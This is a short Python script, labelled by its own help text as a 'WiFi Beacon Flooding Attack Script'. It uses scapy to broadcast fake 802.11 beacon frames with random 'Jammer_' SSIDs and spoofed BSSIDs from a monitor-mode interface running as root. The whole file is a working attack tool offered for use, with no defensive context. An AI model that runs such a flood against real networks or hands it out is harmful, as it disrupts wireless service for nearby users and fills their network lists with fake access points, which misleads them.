#!/usr/bin/env python3
import os
import sys
import time
import random
import argparse
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp


def generate_fake_ssid():
    """Generates a random SSID name."""
    return "Jammer_" + str(random.randint(1000, 9999))


def beacon_flood(iface, count=100):
    """
    Floods the channel with fake beacon frames using random SSIDs.
    """
    for i in range(count):
        ssid = generate_fake_ssid()
        bssid = f"00:11:22:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}"

        packet = RadioTap() / \
                 Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
                 Dot11Beacon(cap="ESS") / \
                 Dot11Elt(ID=0, info=ssid) / \
                 Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c") / \
                 Dot11Elt(ID=3, info=b"\x06")

        print(f"🚀 Sending fake beacon {i + 1}/{count}: SSID={ssid}, BSSID={bssid}")
        sendp(packet, iface=iface, count=1, inter=0.1, verbose=0)


def main():
    parser = argparse.ArgumentParser(description="WiFi Beacon Flooding Attack Script")
    parser.add_argument("--iface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--count", type=int, default=100, help="Number of fake beacons to send (default=100)")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("❌ You must run this script as root.")
        sys.exit(1)

    beacon_flood(args.iface, args.count)


if __name__ == "__main__":
    main()
